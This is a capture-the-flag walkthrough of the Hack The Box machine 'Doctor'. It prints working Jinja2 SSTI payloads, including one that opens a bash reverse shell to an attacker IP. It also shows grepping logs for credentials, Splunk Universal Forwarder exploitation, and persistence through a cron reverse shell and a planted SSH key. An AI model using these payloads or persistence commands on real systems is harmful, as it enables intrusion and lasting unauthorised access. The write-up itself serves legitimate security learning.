## Doctor Hack The Box Walkthrough/Writeup: {#doctor-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Doctor>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        üïô 13:37:21 zsh ‚ùØ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 13:37 GMT

        8089/tcp open  unknown


        ```
    -   **Initial thoughts**:
        -   SSH, HTTP and what could be Splunk running on 8089.


#### Comprehensive Scans: {#comprehensive-scans}

        ```
    -   **Findings**:
        -   System is running apache &amp; ubuntu.
        -   Interestingly it's running Splunk, which is a log analytics tool used to gather, analyze and visualize data, Splunk is often used for security monitoring and business analytics.
            -   What is also good is I know it's possible to get RCE via Splunk if we can get access to the console, also splunk is often running with elevated privileges as it's dealing with system logs. This could be a viable privesc path if we can get access.


### Splunk: `8089`: {#splunk-8089}

-   [This is a great resources which shows Splunk's default ports](https://kinneygroup.com/blog/Splunk-default-ports/) and what they are used for:
    -   As we can see it's most likely a management or API port:
        -   {{< figure src="/ox-hugo/2024-12-21-064514_.png" >}}

-   I try and connect but the page will not load. I also try curling but the connection is continually reset by the host. I am going to restart the host as this in my experience, is not intended behavior from the Splunk Universal Forwarder.


#### Splunk Universal Forwarder Primer: {#splunk-universal-forwarder-primer}

-   Whilst we wait on the box resetting here is a primer on the Splunk universal forwarder and what it does.

-   Think of the Universal Forwarder as Splunk's specialized data courier - a stripped-down version of Splunk Enterprise that's been optimized getting log data from point A to point B, as quickly as possible.

-   By eliminating non-essential components like the UI and Python interpreter, it achieves remarkable performance with minimal system footprint.

-   **Strategic limitations**:
    -   The UF's limitations are actually strategic design choices. These constraints ensure maximum reliability and minimal attack surface - crucial for security-focused deployments.
        1.  No data parsing capabilities (raw data forwarding only)
        2.  Absence of UI and Python support
        3.  Limited local filtering options

-   **Security Features**:
    -   SSL/TLS encryption for data in transit
    -   Configurable authentication mechanisms
    -   Queue persistence during network outages
    -   Robust metadata tagging for forensic integrity

-   **The UF shines in several security-critical scenarios**:
    -   Enterprise-wide endpoint telemetry collection
    -   Real-time security log aggregation
    -   Compliance data gathering
    -   Network traffic monitoring


#### Enumerating Splunk: {#enumerating-splunk}

-   After the reset I can view the page as expected and it appears it is the Universal Forwarder.
    -   {{< figure src="/ox-hugo/2024-12-21-065016_.png" >}}

-   I check all links and two are requesting login credentials `serviceNS` &amp; `service`
    -   {{< figure src="/ox-hugo/2024-12-21-065253_.png" >}}

-   I run some very basic cred stuffing, `admin:admin`, `root:root` etc, but none grant access.

-   I know that it is possible to privesc using the universal forwarder as I have read these article's [Airman's article](https://airman604.medium.com/Splunk-universal-forwarder-hijacking-5899c3e0e6b2) &amp; [Clement Notin's article](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/) before however credentials are required so let's put a pin in this.


### Web `80`: {#web-80}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a website, always use Burp Suite. This allows you to:
        -   Record all potential injection points.
        -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


#### Initial Enumeration: {#initial-enumeration}

-   Browsing to the site we can see it has the domain listed as `doctors.htb` in an email address.
    -   {{< figure src="/ox-hugo/2024-12-20-133932_.png" >}}
    -   I will add this to my `/etc/hosts` file for easy scanning


#### Enumerating doctors.htb {#enumerating-doctors-dot-htb}

-   After adding doctors.htb to my hosts file I navigate to the page and fine a Secure Messaging Service
    -   {{< figure src="/ox-hugo/2024-12-20-135212_.png" >}}
        -   I add some test data as to it's response.
    -   I get the response: "Nope, no such luck"
        -   {{< figure src="/ox-hugo/2024-12-20-135245_.png" >}}
    -   I create a new account following the signup process:
        -   {{< figure src="/ox-hugo/2024-12-20-135801_.png" >}}


#### Finding `/archive` in the html of the homepage {#finding-archive-in-the-html-of-the-homepage}

-   Looking at the source code of the `/home` page once logged in we can see the following `hmtl` comment.
    -   {{< figure src="/ox-hugo/2024-12-20-170222_.png" >}}

-   I navigate to `/archive` however it appears to be a blank page
    -   {{< figure src="/ox-hugo/2024-12-20-170319_.png" >}}
    -   However if we look at the source-code we can see there is xml content

-   I create a test post
    -   {{< figure src="/ox-hugo/2024-12-20-170521_.png" >}}

-   And when I look back in the archive I can see it's listed as an item.
    -   {{< figure src="/ox-hugo/2024-12-20-170624_.png" >}}
    -   As we can see it's pulling the title through in the title tags. Which means it may be vulnerable to SSTI.


#### Fuzzing for SSTI and discovering the template engine. {#fuzzing-for-ssti-and-discovering-the-template-engine-dot}

-   The table below shows what the input and the correct responses should be and then how we should progress.
    -   There is a handy flow chart that corresponds to this on payload all the things:
        -   {{< figure src="/ox-hugo/serverside.png" >}}

| Payload            | Path Taken                    | Template Engine | Result       | Response/Output |
|--------------------|-------------------------------|-----------------|--------------|-----------------|
| `${7*7}`           | Direct Input                  | **Smarty**      | ‚úÖ Vulnerable | `49`            |
|                    |                               | **Mako**        | ‚ùì Unknown   | Unknown         |
| `a{*comment*}b`    | Comment Handling Input        | **Smarty**      | ‚úÖ Vulnerable | `ab`            |
| `${"".join("ab")}` | Join Function Injection       | **Smarty**      | ‚úÖ Vulnerable | `ab`            |
|                    |                               | **Mako**        | ‚úÖ Vulnerable | `ab`            |
|                    |                               | **Jinja2**      | ‚ùì Unknown   | Unknown         |
| `{{7*7}}`          | Double Braces Input           | **Jinja2**      | ‚úÖ Vulnerable | `49`            |
|                    |                               | **Twig**        | ‚úÖ Vulnerable | `49`            |
|                    |                               | **Unknown**     | ‚ùì Unknown   | Unknown         |
| `{{7*'7'}}`        | String Multiplication Attempt | **Jinja2**      | ‚úÖ Vulnerable | `7777777`       |
|                    |                               | **Twig**        | ‚úÖ Vulnerable | `49`            |

-   **Same content as a list for fuzzing**:

<!--listend-->

```text
${7*7}
a{*comment*}b
${"".join("ab")}
{{7*7}}
{{7*'7'}}
```

-   I capture a `POST` request in burp for the creation of a new pose and send to intruder. I then select my injection point and load my payload list.
    -   {{< figure src="/ox-hugo/2024-12-20-173408_.png" >}}
    -   +Note+: You want to ensure that URL encoding is OFF.
        -   {{< figure src="/ox-hugo/2024-12-20-173531_.png" >}}

-   **I then request the archive again and see the following**:
    -   {{< figure src="/ox-hugo/2024-12-20-173639_.png" >}}
    -   If we cross-reference that with the image &amp; table I have above we can see that the only payloads that were processed were the final two `{{7*7}}` &amp; `{{7*'7'}}` and given their responses, `49` for payload 1 and `7777777` for payload 2 we know that this template engine is `jinja2`.


#### RCE POC: {#rce-poc}

-   Even though the above does prove RCE I want to verify this further.
-   I create a new post with the following content as if we have RCE the `/etc/passwd` file is world readable so can confirm.
    ```python
    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
    ```

    -   {{< figure src="/ox-hugo/2024-12-20-174937_.png" >}}
    -   I save it then navigate to `/archive` in order for the SSTI template engine to process the payload.
    -   {{< figure src="/ox-hugo/2024-12-20-175222_.png" >}}
        -   We have RCE, let's get a shell.


## 2. Foothold: {#2-dot-foothold}


### Getting a reverse shell via SSTI: {#getting-a-reverse-shell-via-ssti}

-   I repeat the same process with this payload:

<!--listend-->

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.80/9967 0>&1'").read()}}{%endif%}{%endfor%}
```

-   {{< figure src="/ox-hugo/2024-12-20-180031_.png" >}}
-   {{< figure src="/ox-hugo/2024-12-20-180116_.png" >}}

-   **Reverse shell caught**:
    -   {{< figure src="/ox-hugo/2024-12-20-180136_.png" >}}


#### Exploit/Reverse Shell Breakdown: {#exploit-reverse-shell-breakdown}

The payload:

```python
{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.14.80/9967 0>&1'").read()}}
    {% endif %}
{% endfor %}
```

**Step-by-step Analysis**

1.  **Traversal of Python Classes**:
    -   `().__class__` retrieves the class of an empty tuple (e.g., `<class 'tuple'>`).
    -   `().__class__.__base__` accesses the base class of `tuple`, which is `<class 'object'>`.
    -   `().__class__.__base__.__subclasses__()` enumerates all subclasses of the base `object` class.
        -   **Purpose**: This enables us to traverse the entire Python object hierarchy, including security-sensitive classes.
    -   **Why**:
        -   This traversal is necessary to gain access to internal classes that may expose sensitive or powerful functionality.
        -   The goal is to locate a class that allows interaction with Python's built-in capabilities, particularly those capable of importing modules or executing commands.
        -   Without this enumeration, we wouldn't be able to dynamically discover and exploit useful subclasses like `warnings.WarningMessage`.
    -   **Simple Terms**: It's like looking through a list of all possible tools in Python to find one that can break the system.

2.  **Finding a Specific Subclass**:
    -   `for x in ().__class__.__base__.__subclasses__()`: Iterates through all subclasses of `object`.
    -   `if "warning" in x.__name__`: Filters for a subclass where `"warning"` exists in the class name.
        -   Example match: `<class 'warnings.WarningMessage'>`.
    -   **Why**:
        -   Not all subclasses are useful for exploitation. The filter specifically targets classes that are likely to provide the `_module` attribute or similar access to the `__builtins__` dictionary.
        -   `warnings.WarningMessage` is chosen because it provides a pathway to Python's built-in functions through its `_module` attribute.
        -   We use this class as a pivot to access the dangerous `__builtins__['__import__']` method, which allows importing any module dynamically.
        -   **Simple Terms**: It's like picking a specific tool from the list (a warning-related tool) because it opens the door to other powerful tools hidden inside Python.

3.  **Accessing Built-in Functions**:
    -   `x()._module`: Accesses the module of the identified subclass.
    -   `.__builtins__`: Retrieves the built-in functions of the module.
    -   `['__import__']('os')`: Dynamically imports the `os` module.

4.  **Executing the Reverse Shell Command**:
    -   `os.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.80/9967 0>&1'").read()`: Opens a subprocess to execute a reverse shell command.
    -   **Effect**: The server connects to our machine (10.10.14.80) on port 9967, granting remote access.


#### Exploitation Mitigation Techniques: {#exploitation-mitigation-techniques}

-   **Input Validation**: Ensure user inputs are sanitized before being passed to the template.
-   **Use Sandboxed Template Engines**: Configure Jinja2 with a sandbox to limit its capabilities.
-   **Disable Dangerous Features**: Restrict access to functions like `__builtins__` or `os` that can execute arbitrary commands.


### Discovering Our User is part of the adm group: {#discovering-our-user-is-part-of-the-adm-group}

-   Looking through the host there is a user called shaun, however we cannot read anything in his home directory, however we can list the contents.
-   I check our group membership and can see our user is part of the `adm` group.
    -   {{< figure src="/ox-hugo/2024-12-20-182518_.png" >}}

-   **adm primer**:
    -   Members of the `adm` group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
        -   **We can run to search for creds**:
            ```shell
            find /var/log -type f -exec grep "password" {} +
            find /var/log -type f -exec grep "username" {} +
            ```


### Finding a clear text password in `/var/log/apache2` logs {#finding-a-clear-text-password-in-var-log-apache2-logs}

-   I run `find /var/log -type f -exec grep "password" {} +` &amp; discover a clear text password.
    -   {{< figure src="/ox-hugo/2024-12-20-183016_.png" >}}
        -   `Guitar123`
        -   +Note+: Even though it appears to be being passed as an argument to the `email` parameter it's not an email so we can surmise it's a password entered incorrectly in the email field.

-   I check if it's valid for "Shaun" &amp; can login as him
    -   {{< figure src="/ox-hugo/2024-12-20-183141_.png" >}}
    -   +Note+: I check if it's valid for ssh but it's not.


### Enumerating as shaun: {#enumerating-as-shaun}

-   Let's grab our user flag.
    -   {{< figure src="/ox-hugo/2024-12-20-183311_.png" >}}

-   I do some further enumeration but nothing is found on the host that I can see.


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Logging into splunk Universal Forwarder as shaun: {#logging-into-splunk-universal-forwarder-as-shaun}

-   I re-open the splunk universal forwarder page and try shauns creds &amp; they work. This time I provided with alot more options.
    -   {{< figure src="/ox-hugo/2024-12-21-071139_.png" >}}

-   Now we can enumerate this, however I know for a fact that with creds we can privesc using [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2).


### Getting root using SplunkWhisperer2 to exploit the Universal Forwarder: {#getting-root-using-splunkwhisperer2-to-exploit-the-universal-forwarder}

-   **Quick POC to verify RCE**:
    -   I stand up a quick python web-server and have SplunkWhisperer curl it to verify that we can infact run commands on the host &amp; we can.
        -   {{< figure src="/ox-hugo/2024-12-21-071902_.png" >}}

-   **Getting our reverse root shell**:
    ```shell

## 4. Persistence: {#4-dot-persistence}

-   As a means to ensure persistence on this machine I will create and add an SSH key as we know that service is running. I will also add a cronjob that calls back out to my attack machine at a set interval.


### Persistence Method 1: Creating a cron job reverse shell: {#persistence-method-1-creating-a-cron-job-reverse-shell}

```shell
(crontab -l > .tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.80/80 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
```

-   {{< figure src="/ox-hugo/2024-12-21-075648_.png" >}}

-   Let's verify it's in the crontab by running `crontab -l`
    -   {{< figure src="/ox-hugo/2024-12-21-075743_.png" >}}
    -   As we can see it's running.

-   I start my listener and get a connection back after 1 minute.
    -   {{< figure src="/ox-hugo/2024-12-21-075844_.png" >}}

-   +Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.


### Persistence Method 2: Adding an SSH key: {#persistence-method-2-adding-an-ssh-key}

-   So typically what we could do is make a new user, however I am going to generate a key for the root user we already have access too.

<!--listend-->

-   **Generate SSH Key for the User**:
    ```shell
    ssh-keygen -t rsa -b 4096
    ```

    -   {{< figure src="/ox-hugo/2024-12-21-080723_.png" >}}

-   **Copy Public Key to Authorized Keys**:
    ```shell
    cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys
    ```

    -   This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user.
    -   {{< figure src="/ox-hugo/2024-12-21-080801_.png" >}}

-   **Copy Private key to attack machine**:
    ```shell
    cat id_rsa
    ```

    -   {{< figure src="/ox-hugo/2024-12-21-080902_.png" >}}

-   **Change the mode of the key so the permissions are not too open**:
    ```shell
    sudo chmod 400 id_rsa
    ```

-   **Verify it works**:
    ```shell
    ssh -i id_rsa root@$box
    ```
-   {{< figure src="/ox-hugo/2024-12-21-081007_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  This took my way longer to complete than I would have liked. Web is currently my weakest area so I am making a concerted effort to do these types of boxes and challenges in order to improve my web weaknesses.
2.  I learned to always look at source code even if the page appears empty or unimportant. As two key pieces of information were found this way.
    1.  The initial `html` comment regarding `/archive` on the message upload page.
    2.  The xml contents of the `/archive` page itself which provided the foothold as we were able to fuzz for SSTI.
3.  I also learned I am going to grind these like I did AD boxes to improve. Doing lots of AD boxes really helped me get better and dial in.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  I tried for a long time to connect to Splunks Universal Forwarder with HTTP, instead of HTTPS that wasted a good few mins.
2.  I had a moment where my brain was fried when figuring out cron syntax, luckily this exists <https://cron.help>
